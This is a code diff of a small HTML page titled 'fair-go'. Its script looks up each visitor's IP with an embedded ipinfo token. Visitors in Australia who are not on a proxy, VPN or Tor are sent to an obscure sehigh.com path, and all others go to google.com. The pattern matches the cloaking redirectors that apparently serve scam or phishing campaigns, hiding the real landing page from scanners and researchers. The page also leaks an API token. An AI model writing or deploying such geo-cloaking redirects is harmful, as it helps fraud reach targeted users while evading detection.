@@ -1,45 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirect</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>fair-go</title>
   <script>
-    const allowedCountry = 'AU'; // Australia only
-    const token = "396ec7a7e34187"; // Token dyalek
+    const allowedCountry = 'AU';
+    const token = "396ec7a7e34187";
 
-    $.get(`https://ipinfo.io/json?token=${token}`, function(data) {
-      const ip = data.ip;
-      const country = data.country;
+    async function checkAccess() {
+      try {
+        const ipResponse = await fetch(`https://ipinfo.io/json?token=${token}`);
+        const ipData = await ipResponse.json();
 
-      console.log("IP:", ip);
-      console.log("Country:", country);
+        const ip = ipData.ip;
+        const country = ipData.country;
 
-      // Check proxy or VPN using IPinfo privacy API
-      $.get(`https://ipinfo.io/${ip}/privacy?token=${token}`, function(privacyData) {
+        const privacyResponse = await fetch(`https://ipinfo.io/${ip}/privacy?token=${token}`);
+        const privacyData = await privacyResponse.json();
+
         const isProxy = privacyData.proxy;
         const isVPN = privacyData.vpn;
         const isTor = privacyData.tor;
 
-        console.log("Proxy:", isProxy);
-        console.log("VPN:", isVPN);
-        console.log("Tor:", isTor);
-
         if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
-          // Real AU user
           window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
         } else {
-          // Not allowed
           window.location.href = "https://google.com";
         }
-      });
 
-    }).fail(function(err) {
-      console.error("IP check failed:", err);
-      window.location.href = "https://google.com";
-    });
+      } catch (error) {
+        console.error("Error:", error);
+        window.location.href = "https://google.com";
+      }
+    }
+
+    window.onload = checkAccess;
   </script>
 </head>
 <body>
